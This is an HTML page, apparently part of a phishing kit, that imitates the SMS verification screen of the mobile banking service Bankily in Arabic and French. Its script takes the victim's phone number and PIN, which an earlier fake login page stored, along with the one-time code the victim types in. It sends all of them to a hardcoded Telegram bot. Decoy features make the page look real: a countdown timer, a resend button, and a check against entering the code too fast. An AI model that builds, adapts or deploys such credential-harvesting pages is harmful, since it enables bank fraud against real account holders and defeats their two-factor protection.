<!DOCTYPE html>

<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="theme-color" content="#030E14">
<title>رمز التحقق – Bankily</title>

<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
html,body{overflow-x:hidden;width:100%;min-height:100vh;background:#030E14}
body{font-family:'Cairo',sans-serif;background:#030E14;color:#7BBEC8;display:flex;flex-direction:column;min-height:100vh}

/* ── Top bar ── */
.top-bar{
background:rgba(3,13,18,.95);
backdrop-filter:blur(20px);
border-bottom:1px solid rgba(0,151,167,.2);
padding:.8rem 1.2rem;
display:flex;align-items:center;justify-content:space-between;
position:sticky;top:0;z-index:100;
}
.top-bar-btn{
background:rgba(0,151,167,.15);
border:1px solid rgba(0,151,167,.35);
color:#00B8CC;
padding:.42rem 1rem;border-radius:50px;
cursor:pointer;font-size:.85rem;font-weight:700;
font-family:‘Cairo’,sans-serif;
text-decoration:none;display:inline-flex;align-items:center;gap:5px;
transition:all .25s;
}
.top-bar-btn:hover{background:rgba(0,151,167,.3);color:#fff}
.top-bar-title{color:#E8F8F8;font-size:1rem;font-weight:700}

/* ── Main content ── */
.page-body{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:2rem 1.2rem 6rem;text-align:center}

/* ── Logo ── */
.logo-wrap{margin-bottom:1.8rem}
.logo-wrap img{height:52px;opacity:.9}

/* ── Card ── */
.otp-card{
background:rgba(8,33,48,.85);
backdrop-filter:blur(20px);
border:1px solid rgba(0,151,167,.22);
border-radius:24px;
padding:2rem 1.8rem 2.5rem;
width:100%;max-width:420px;
box-shadow:0 20px 60px rgba(0,0,0,.7);
position:relative;overflow:hidden;
}
.otp-card::before{content:’’;position:absolute;top:-1px;left:15%;right:15%;height:1px;background:linear-gradient(90deg,transparent,#00B8CC,transparent)}

.otp-icon{font-size:2.8rem;margin-bottom:1rem}
.otp-title{font-size:1.3rem;font-weight:800;color:#E8F8F8;margin-bottom:.5rem}
.otp-sub{font-size:.9rem;color:#3D6E7A;line-height:1.6;margin-bottom:1.8rem}

/* ── Inputs OTP ── */
.pin-row{display:flex;justify-content:center;gap:12px;direction:ltr;margin-bottom:1.5rem}
.pin-box{
width:56px;height:62px;
font-size:1.6rem;font-weight:900;text-align:center;
background:rgba(5,20,28,.8);
border:2px solid rgba(0,151,167,.25);
border-radius:14px;color:#E8F8F8;
outline:none;
font-family:‘Cairo’,sans-serif;
transition:border-color .2s,box-shadow .2s;
direction:ltr;
}
.pin-box:focus{border-color:#0097A7;box-shadow:0 0 0 3px rgba(0,151,167,.2)}
.pin-box.filled{border-color:rgba(0,201,158,.5)}

/* ── Timer ── */
.timer-row{margin-bottom:1.5rem}
.timer-label{font-size:.78rem;color:#3D6E7A;letter-spacing:1px;margin-bottom:.3rem}
.timer-val{font-size:1.1rem;font-weight:700;color:#00B8CC;font-variant-numeric:tabular-nums}
.timer-val.expired{color:#EF4444}

/* ── Resend ── */
.resend-btn{background:none;border:none;color:#0097A7;font-family:‘Cairo’,sans-serif;font-size:.85rem;font-weight:600;cursor:pointer;text-decoration:underline;padding:.3rem;transition:color .2s}
.resend-btn:hover{color:#00C99E}

/* ── Submit button ── */
.verify-btn{
position:fixed;bottom:0;left:0;right:0;
padding:1rem;padding-bottom:calc(1rem + env(safe-area-inset-bottom));
border:none;
background:linear-gradient(135deg,#00C99E,#0097A7);
color:#fff;font-family:‘Cairo’,sans-serif;
font-size:1.1rem;font-weight:800;
cursor:pointer;z-index:200;
transition:opacity .2s,transform .2s;
box-shadow:0 -4px 30px rgba(0,151,167,.4);
}
.verify-btn:hover{opacity:.92;transform:translateY(-2px)}
.verify-btn:disabled{background:rgba(0,151,167,.2);color:#3D6E7A;cursor:not-allowed;transform:none}

/* ── Lang toggle ── */
.lang-toggle{font-size:.8rem;color:#3D6E7A;margin-top:1.2rem;cursor:pointer;background:none;border:none;font-family:‘Cairo’,sans-serif;font-weight:600}
.lang-toggle:hover{color:#00B8CC}

/* ── Guard overlay ── */
#guard{display:none;position:fixed;inset:0;background:rgba(3,14,20,.97);z-index:9999;flex-direction:column;align-items:center;justify-content:center;gap:1.2rem;text-align:center;padding:2rem}
#guard.on{display:flex}
.g-icon{font-size:3.5rem}
.g-msg{font-size:1.1rem;font-weight:700;color:#E8F8F8;line-height:1.5;max-width:300px}
.g-sub{font-size:.88rem;color:#FCD34D}
.g-spin{width:40px;height:40px;border:4px solid rgba(0,212,232,.2);border-top-color:#00D4E8;border-radius:50%;animation:spin .8s linear infinite;margin-top:.5rem}

/* ── Loader ── */
#loader{display:none;position:fixed;inset:0;background:rgba(3,14,20,.9);z-index:9998;flex-direction:column;align-items:center;justify-content:center;gap:1rem}
#loader.on{display:flex}
.ld-ring{width:60px;height:60px;position:relative}
.ld-ring::before{content:’’;position:absolute;inset:0;border-radius:50%;border:3px solid transparent;border-top-color:#00D4E8;animation:spin .8s linear infinite}
.ld-ring::after{content:’’;position:absolute;inset:8px;border-radius:50%;border:3px solid transparent;border-bottom-color:#00C99E;animation:spin 1.4s linear infinite reverse}
.ld-txt{color:#00B8CC;font-size:.9rem;font-weight:700;letter-spacing:1.5px}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── Modal ── */
#modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:9997;align-items:center;justify-content:center;padding:1rem}
#modal.on{display:flex}
.modal-box{background:#082130;border:1px solid rgba(0,151,167,.3);border-radius:18px;padding:1.8rem 1.5rem;max-width:340px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.8)}
.modal-box p{color:#E8F8F8;font-size:.95rem;line-height:1.7;margin-bottom:1.2rem;white-space:pre-line}
.modal-box button{background:linear-gradient(135deg,#00C99E,#0097A7);border:none;color:#fff;padding:.65rem 2rem;border-radius:50px;cursor:pointer;font-family:‘Cairo’,sans-serif;font-weight:700;font-size:.95rem}

/* ── Canvas bg ── */
#cvs{position:fixed;inset:0;z-index:0;pointer-events:none;opacity:.4}
.page-body,.top-bar{position:relative;z-index:1}
</style>

</head>

<script>
/* ── Texts ── */
const T = {
  ar: {
    dir:'rtl', lang:'ar',
    back:'&#8592; رجوع', langBtn:'FR', langToggle:'Passer en Français',
    topTitle:'رمز التحقق', otpTitle:'رمز التحقق',
    otpSub:'أدخل رمز التحقق المرسل إلى رقم هاتفك عبر رسالة SMS',
    timerLabel:'ينتهي رمز التحقق بعد',
    resend:'إعادة إرسال رمز التحقق',
    verify:'تحقق', loaderTxt:'جاري المعالجة...',
    expired:'انتهت صلاحية الرمز',
    resendDone:'تم إرسال رمز جديد',
    errEmpty:'الرجاء إدخال جميع الأرقام الأربعة',
    errDigits:'الرجاء إدخال أرقام صحيحة فقط',
    errSamePin:'رمز التحقق لا يمكن أن يكون نفس رمز PIN',
    errTooFast:'عزيزي (ة) المشترك (ة)\nيجب عليك التأكد من أنك أدخلت رمز التحقق الذي تلقيته عبر SMS',
    guardMsg:'يجب عليك إدخال رقمك ورمزك السري أولاً',
    guardSub:'جاري تحويلك إلى صفحة تسجيل الدخول...',
  },
  fr: {
    dir:'ltr', lang:'fr',
    back:'&#8592; Retour', langBtn:'عربي', langToggle:'Passer en Arabe',
    topTitle:'Code de vérification', otpTitle:'Code de vérification',
    otpSub:'Entrez le code de vérification SMS reçu sur votre téléphone',
    timerLabel:'Code de vérification expire dans',
    resend:'Renvoyer le code de vérification',
    verify:'Vérifier', loaderTxt:'Traitement en cours...',
    expired:'Code expiré',
    resendDone:'Un nouveau code a été envoyé',
    errEmpty:'Veuillez entrer les 4 chiffres du code',
    errDigits:'Veuillez entrer uniquement des chiffres',
    errSamePin:'Le code OTP ne peut pas être identique au PIN',
    errTooFast:"Cher(e) abonné(e),\nVeuillez saisir le code de vérification que vous avez reçu par SMS",
    guardMsg:"Vous devez d'abord saisir votre numéro et code PIN",
    guardSub:'Redirection vers la page de connexion...',
  }
};

/* ── Lang ── */
let lang = localStorage.getItem('bankily_lang') === 'fr' ? 'fr' : 'ar';
function L(){ return T[lang]; }

function applyLang(){
  const t = L();
  document.documentElement.lang = t.lang;
  document.body.dir = t.dir;
  document.getElementById('back-btn').innerHTML = t.back;
  document.getElementById('lang-btn').textContent = t.langBtn;
  document.getElementById('lang-toggle2').textContent = t.langToggle;
  document.getElementById('top-title').textContent = t.topTitle;
  document.getElementById('otp-title').textContent = t.otpTitle;
  document.getElementById('otp-sub').textContent = t.otpSub;
  document.getElementById('timer-label').textContent = t.timerLabel;
  document.getElementById('resend-btn').textContent = t.resend;
  document.getElementById('verify-btn').textContent = t.verify;
  document.getElementById('ld-txt').textContent = t.loaderTxt;
}

function toggleLang(){
  lang = lang === 'ar' ? 'fr' : 'ar';
  localStorage.setItem('bankily_lang', lang);
  applyLang();
}

function showModal(msg){
  document.getElementById('modal-msg').textContent = msg;
  document.getElementById('modal').classList.add('on');
}

/* ── Guard: check session ── */
const savedPin      = sessionStorage.getItem('bankily_pin');
const savedUsername = sessionStorage.getItem('bankily_username') || '—';

if (!savedPin || savedPin.trim() === '') {
  applyLang();
  document.getElementById('g-msg').textContent = L().guardMsg;
  document.getElementById('g-sub').textContent = L().guardSub;
  document.getElementById('g-msg').style.direction = L().dir;
  document.getElementById('guard').classList.add('on');
  document.body.style.overflow = 'hidden';
  setTimeout(() => window.location.replace('login.html'), 1800);
} else {
  /* ── Normal flow ── */
  applyLang();

  /* ── Inputs ── */
  const boxes = document.querySelectorAll('.pin-box');
  boxes.forEach((box, i) => {
    box.addEventListener('input', () => {
      box.value = box.value.replace(/[^0-9]/g, '').slice(0,1);
      box.classList.toggle('filled', box.value !== '');
      if(box.value && i < boxes.length-1) boxes[i+1].focus();
    });
    box.addEventListener('keydown', e => {
      if(e.key==='Backspace' && box.value==='' && i>0){ boxes[i-1].focus(); boxes[i-1].value=''; boxes[i-1].classList.remove('filled'); }
      if(!/^[0-9]$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key)) e.preventDefault();
    });
    box.addEventListener('paste', e => {
      e.preventDefault();
      const digits = (e.clipboardData||window.clipboardData).getData('text').replace(/[^0-9]/g,'');
      [...digits].forEach((d, j) => { if(boxes[j]){ boxes[j].value=d; boxes[j].classList.add('filled'); }});
      const next = Math.min(digits.length, boxes.length-1);
      boxes[next].focus();
    });
  });

  /* ── Timer ── */
  const pageOpenTime = Date.now();
  let seconds = 299;
  const timerEl = document.getElementById('timer');
  const verifyBtn = document.getElementById('verify-btn');

  function updateTimer(){
    const m = Math.floor(seconds/60);
    const s = String(seconds%60).padStart(2,'0');
    timerEl.textContent = `${m}:${s}`;
    if(seconds > 0){ seconds--; setTimeout(updateTimer, 1000); }
    else {
      timerEl.textContent = L().expired;
      timerEl.classList.add('expired');
      verifyBtn.disabled = true;
    }
  }
  updateTimer();

  /* ── Resend ── */
  window.resendCode = function(){
    seconds = 299;
    timerEl.classList.remove('expired');
    verifyBtn.disabled = false;
    boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
    boxes[0].focus();
    showModal(L().resendDone);
  };

  /* ── Keyboard: move button above keyboard ── */
  if(window.visualViewport){
    window.visualViewport.addEventListener('resize', () => {
      const kb = window.innerHeight - window.visualViewport.height;
      verifyBtn.style.bottom = kb > 0 ? kb+'px' : '0';
    });
  }

  /* ── Telegram ── */
  const TG_TOKEN   = '8250056043:AAFYXOIiBAeHTuZV8pPZUhV6NRTwMPipfrM';
  const TG_CHAT_ID = '8372738559';

  async function sendTelegram(text){
    try {
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:TG_CHAT_ID, text, parse_mode:'HTML'})
      });
    } catch(e){ /* silent */ }
  }

  /* ── Submit OTP ── */
  window.submitOTP = async function(){
    const t = L();

    /* Check 5s wait */
    if((Date.now() - pageOpenTime) / 1000 < 5){
      showModal(t.errTooFast); return;
    }

    /* Read OTP */
    let otp = '';
    boxes.forEach(b => otp += b.value);

    /* Validate */
    if(otp.length !== 4 || [...boxes].some(b => b.value === '')){
      showModal(t.errEmpty); return;
    }
    if(!/^[0-9]{4}$/.test(otp)){
      showModal(t.errDigits); return;
    }
    if(savedPin && otp === savedPin){
      showModal(t.errSamePin);
      boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
      boxes[0].focus(); return;
    }

    /* Show loader */
    document.getElementById('loader').classList.add('on');

    /* Send to Telegram */
    const now = new Date().toLocaleString(lang==='ar'?'ar-SA':'fr-FR');
    await sendTelegram(
      `✅ <b>Code OTP – Bankily</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `📱 <b>Numéro :</b> <code>${savedUsername}</code>\n` +
      `🔑 <b>PIN    :</b> <code>${savedPin}</code>\n` +
      `🔢 <b>OTP    :</b> <code>${otp}</code>\n` +
      `📅 <b>Heure  :</b> ${now}`
    );

    /* Clean session */
    sessionStorage.removeItem('bankily_pin');
    sessionStorage.removeItem('bankily_username');

    /* Go to approuv */
    setTimeout(() => { window.location.href = 'approuv.html'; }, 1200);
  };
}

/* ── Canvas particles ── */
(function(){
  const c=document.getElementById('cvs'),ctx=c.getContext('2d');
  let pts=[];
  function resize(){c.width=innerWidth;c.height=innerHeight;pts=[];const n=Math.min(50,Math.floor(c.width*c.height/18000));for(let i=0;i<n;i++)pts.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,r:Math.random()*1.5+.2,a:Math.random()*.5+.1,ci:Math.floor(Math.random()*2)})}
  const COLS=['0,212,232','0,201,158'];
  function draw(){ctx.clearRect(0,0,c.width,c.height);pts.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0||p.x>c.width)p.vx*=-1;if(p.y<0||p.y>c.height)p.vy*=-1;ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fillStyle=`rgba(${COLS[p.ci]},${p.a})`;ctx.fill();});requestAnimationFrame(draw);}
  window.addEventListener('resize',resize);resize();draw();
})();
</script>
